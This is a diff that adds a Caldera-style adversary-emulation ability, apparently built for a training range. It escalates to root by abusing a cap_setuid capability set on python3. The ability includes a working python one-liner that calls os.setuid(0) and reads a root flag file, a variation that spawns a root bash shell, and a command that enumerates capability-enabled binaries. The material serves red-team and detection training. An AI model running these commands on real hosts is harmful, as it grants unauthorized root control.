@@ -1,0 +1,60 @@
+- name: AETHON PrivEsc — Linux cap_setuid Abuse on Python3 Binary
+  description: >
+    Exploits a misconfigured Linux capability (cap_setuid+ep) set on the
+    python3 binary on aethon-core. An attacker with opsadmin shell access
+    uses python3 to call os.setuid(0) — setting their effective UID to root
+    without requiring a password or sudo — then reads the final flag from
+    /root/flag5.txt. Generates auditd capability-use events, setuid syscall
+    entries, and privilege change records for blue team detection.
+  tactic: privilege-escalation
+  technique_id: T1548
+  technique_name: Abuse Elevation Control Mechanism
+  singleton: false
+  repeatable: false
+  delete_payload: false
+  executors:
+  - name: sh
+    platform: linux
+    command: >
+      echo "[*] Checking for capabilities on python3...";
+      PYTHON3=$(which python3);
+      getcap $PYTHON3;
+      echo "[*] Verifying cap_setuid is present...";
+      getcap $PYTHON3 | grep -q cap_setuid && echo "[+] cap_setuid CONFIRMED" || echo "[-] cap_setuid not found";
+      echo "[*] Exploiting cap_setuid to become root...";
+      python3 -c "
+      import os
+      print(f'[*] Current UID: {os.getuid()}')
+      os.setuid(0)
+      print(f'[+] UID after setuid(0): {os.getuid()}')
+      flag = open('/root/flag5.txt').read().strip()
+      print(f'[+] FLAG: {flag}')
+      os.system('id')
+      os.system('whoami')
+      " > /tmp/capset_result.txt 2>&1;
+      cat /tmp/capset_result.txt
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 30
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_sh
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup:
+    - rm -f /tmp/capset_result.txt
+    variations:
+    - description: Spawn interactive root shell via capability abuse
+      command: >
+        python3 -c "import os; os.setuid(0); os.execv('/bin/bash', ['/bin/bash'])"
+    - description: Enumerate all binaries with capabilities on this host
+      command: >
+        find / -xdev 2>/dev/null | xargs getcap 2>/dev/null
+    additional_info: {}
+  requirements: []
+  id: 8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c
